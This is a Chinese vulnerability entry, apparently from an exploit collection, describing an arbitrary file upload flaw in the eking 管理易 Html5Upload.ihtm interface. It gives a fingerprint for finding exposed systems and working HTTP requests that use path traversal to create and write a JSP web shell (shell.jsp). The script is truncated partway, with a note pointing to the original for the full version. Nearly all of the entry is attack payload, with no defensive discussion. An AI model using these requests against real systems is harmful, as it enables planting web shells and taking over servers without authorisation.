# eking管理易Html5Upload接口存在任意文件上传漏洞

- **系统**：eking　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="EKing-管理易"`
- **请求**：`POST /Html5Upload.ihtm HTTP/1.1`

**请求体 / payload**
```
创建临时文件
Host:
Content-Type: application/x-www-form-urlencoded
comm_type=INIT&sign_id=shell&vp_type=default&file_name=../../shell.jsp&file_size=2048
写入文件内容
POST /Html5Upload.ihtm HTTP/1.1
Host:
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR
------WebKitFormBoundaryj7OlOPiiukkdktZR
Content-Disposition: form-data; name="comm_type"
DATA
------WebKitFormBoundaryj7OlOPiiukkdktZR
Content-Disposition: form-data; name="sign_id"
shell
------WebKitFormBoundaryj7OlOPiiukkdktZR
Content-Disposition: form-data; name="data_inde"
0
------WebKitFormBoundaryj7OlOPiiukkdktZR
Con…（脚本共 1224 字，完整版见原文）
```
- **预期**：200　|　OK